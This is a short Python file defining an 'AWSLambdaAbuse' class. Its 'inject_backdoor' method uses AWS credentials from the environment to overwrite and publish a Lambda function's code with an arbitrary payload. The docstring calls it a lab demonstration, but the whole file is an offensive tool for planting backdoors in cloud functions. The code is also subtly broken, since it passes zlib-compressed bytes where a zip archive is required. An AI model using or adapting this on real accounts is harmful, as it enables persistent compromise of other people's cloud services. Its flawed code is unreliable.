import os
import boto3
import zlib
import logging

class AWSLambdaAbuse:
    """
    Demonstrates malicious Lambda code updates for testing.
    DO NOT use with real AWS credentials outside of isolated labs.
    """

    def __init__(self, region_name="us-west-2"):
        self.logger = logging.getLogger(__name__)
        
        aws_access_key_id = os.getenv('AWS_ACCESS_KEY_ID')
        aws_secret_access_key = os.getenv('AWS_SECRET_ACCESS_KEY')
        
        if not aws_access_key_id or not aws_secret_access_key:
            raise EnvironmentError("AWS credentials not set in environment variables.")
        
        self.lambda_client = boto3.client(
            'lambda',
            region_name=region_name,
            aws_access_key_id=aws_access_key_id,
            aws_secret_access_key=aws_secret_access_key
        )
    
    def inject_backdoor(self, function_name, payload):
        """
        Compresses and updates the Lambda function code with the provided payload.
        """
        if not function_name or not payload:
            raise ValueError("Function name and payload are required.")
        
        compressed = zlib.compress(payload)
        try:
            response = self.lambda_client.update_function_code(
                FunctionName=function_name,
                ZipFile=compressed,
                Publish=True
            )
            return response.get('FunctionArn')
        except Exception as e:
            self.logger.error(f"Failed to update Lambda function code: {e}")
            raise
